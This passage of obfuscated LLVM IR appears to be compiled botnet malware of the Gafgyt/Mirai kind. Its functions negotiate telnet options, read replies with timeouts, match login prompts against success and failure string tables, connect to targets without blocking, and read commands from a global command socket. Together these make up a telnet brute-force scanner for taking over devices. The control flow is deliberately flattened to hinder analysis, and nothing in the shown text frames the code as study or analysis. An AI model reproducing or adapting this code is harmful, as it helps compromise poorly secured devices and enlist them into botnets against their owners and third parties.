  store i32 %68, i32* %15, align 4
  store i32 1961829336, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 211601846, i32 -882269983
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 725760664, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 -1038186269, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 739008170, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 -818142088, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 -986274335, i32 1821297253
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 2033237221, i32 234173186
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 -1982774527, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 -1683105112, i32 -479706691
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 1821297253, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 -818142088, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 -1982774527, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 555780780, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 555780780, label %first
    i32 1953214884, label %8
    i32 -658918292, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 1953214884, i32 -658918292
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 -658918292, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 438153348, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 438153348, label %NodeBlock
    i32 980238917, label %LeafBlock1
    i32 -1794162168, label %LeafBlock
    i32 -383606790, label %16
    i32 -1189985965, label %17
    i32 746115995, label %26
    i32 -2068989134, label %27
    i32 1798442594, label %34
    i32 -808171707, label %35
    i32 2075771992, label %42
    i32 -1125918123, label %50
    i32 546741149, label %58
    i32 -1445547941, label %59
    i32 915052320, label %60
    i32 -1365296761, label %NewDefault
    i32 503533931, label %67
    i32 -381790828, label %68
    i32 -1787634824, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -1794162168, i32 980238917
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -383606790, i32 -1365296761
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 -1189985965, i32 -1365296761
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -1787634824, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 746115995, i32 -2068989134
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 915052320, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 1798442594, i32 -808171707
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -1445547941, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 2075771992, i32 -1125918123
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 546741149, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 546741149, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1445547941, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 915052320, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -381790828, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 503533931, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -381790828, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -1787634824, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 508144426, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 508144426, label %8
    i32 224248722, label %17
    i32 1969231211, label %18
    i32 -978694736, label %19
    i32 -191109620, label %24
    i32 306031996, label %34
    i32 -90033658, label %35
    i32 1980407846, label %36
    i32 1100849629, label %39
    i32 1962329461, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 224248722, i32 1969231211
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 508144426, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -978694736, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 -191109620, i32 1100849629
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcasestr(i8* %25, i8* %30) #10
  %32 = icmp ne i8* %31, null
  %33 = select i1 %32, i32 306031996, i32 -90033658
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1962329461, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 1980407846, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -978694736, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1962329461, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strcasestr(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 1151603600, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1151603600, label %18
    i32 1695133638, label %27
    i32 -1824843711, label %44
    i32 1010832327, label %45
    i32 1029458822, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #2, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 1695133638, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 -1824843711, i32 1010832327
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1029458822, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 1029458822, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1937523171, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1937523171, label %first
    i32 -868228003, label %28
    i32 -1185051298, label %32
    i32 615389081, label %38
    i32 -890771782, label %39
    i32 -1584792041, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 -868228003, i32 -1185051298
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 -1185051298, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 615389081, i32 -890771782
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 -1584792041, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -1584792041, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -550503962, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -550503962, label %first
    i32 565772579, label %8
    i32 -134510084, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 565772579, i32 -134510084
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 -134510084, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([9 x i8*], [9 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1478305228, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1478305228, label %first
    i32 1851004750, label %7
    i32 -2064027146, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 -2064027146, i32 1851004750
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 -2064027146, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %20 = load i32, i32* %6, align 4
  %21 = call i32 (i32, i32, ...) @fcntl(i32 %20, i32 3, i8* null)
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %15, align 8
  %23 = load i64, i64* %15, align 8
  %24 = or i64 %23, 2048
  store i64 %24, i64* %15, align 8
  %25 = load i32, i32* %6, align 4
  %26 = load i64, i64* %15, align 8
  %27 = call i32 (i32, i32, ...) @fcntl(i32 %25, i32 4, i64 %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = trunc i32 %29 to i16
  %31 = call zeroext i16 @htons(i16 zeroext %30) #13
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  %33 = load i8*, i8** %7, align 8
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %35 = call i32 @getHost(i8* %33, %struct.in_addr* %34)
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1499925298, i32* %switchVar
  br label %loopEntry

